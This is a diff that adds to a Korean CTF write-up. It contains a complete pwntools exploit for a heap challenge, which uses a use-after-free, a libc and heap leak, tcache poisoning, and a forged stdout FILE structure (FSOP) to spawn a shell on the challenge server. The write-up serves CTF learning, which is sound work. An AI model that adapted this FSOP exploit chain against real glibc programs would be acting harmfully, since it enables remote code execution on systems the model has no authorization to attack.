@@ -167,4 +167,115 @@ __int64 sub_4012D6()
 }
 ```
 
-`edit`도 있고, `free`에서는 `UAF`도 발생한다. `edit`에서 함수 포인터를 릭 함수로 변조하고 `unsorted bin`에 있는 청크로 `heap, libc` 릭을 동시에 한 다음 `FSOP`로 무
+`edit`도 있고, `free`에서는 `UAF`도 발생한다. `edit`에서 함수 포인터를 릭 함수로 변조하고 `unsorted bin`에 있는 청크로 `heap, libc` 릭을 동시에 한 다음 `FSOP`로 마무리한다.
+
+```python
+from pwn import *
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    #'b *0x401796',
+    #'b *0x401545',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("chall.polygl0ts.ch", 9036)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+l = ELF('./libc.so.6')
+
+def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
+                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
+                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
+                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
+                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
+                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
+    
+    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
+    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
+    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
+    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
+    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
+    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
+    FSOP += p64(__pad5) + p32(_mode)
+    if _unused2 == b"":
+        FSOP += b"\x00" * 0x14
+    else:
+        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
+    
+    FSOP += p64(vtable)
+    FSOP += more_append
+    return FSOP
+
+def create(sz : int):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b': ', str(sz).encode())
+
+def delete(idx : int):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b': ', str(idx).encode())
+
+def read(idx : int):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b': ', str(idx).encode())
+
+def edit(idx : int, ctt : bytes):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendafter(b': ', ctt)
+
+create(0x420)
+create(0x100)
+create(0x100)
+for i in range(22):
+    create(0x18)
+create(-11)
+create(0x4041a8-4)
+create(0)
+delete(0)
+delete(1)
+delete(2)
+edit(23, p32(3) + p64(0x4041A8 - 0x10) + p64(0x401389))
+read(0)
+heap_base = int(p.recvline().split(b': ')[1][:-1], 16)
+heap_base >>= 12
+heap_base <<= 12
+l.address = u64(p.recvline().split(b': ')[1][:-1].ljust(8, b'\x00')) - 0x21ace0
+print(hex(heap_base))
+print(hex(l.address))
+
+fake_fsop_struct = l.sym['_IO_2_1_stdout_']
+stdout_lock = l.address + 0x21ca70
+FSOP = FSOP_struct(
+	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
+	lock=stdout_lock,
+	_wide_data=fake_fsop_struct - 0x10,
+	_markers=l.symbols["system"],
+	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
+	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
+	_mode=0xFFFFFFFF,
+)
+
+print(hex(fake_fsop_struct))
+edit(2, p64(fake_fsop_struct ^ (heap_base >> 12)) + b'a' * 8)
+create(0x100)
+create(0x100)
+edit(4, FSOP)
+
+p.interactive()
+```
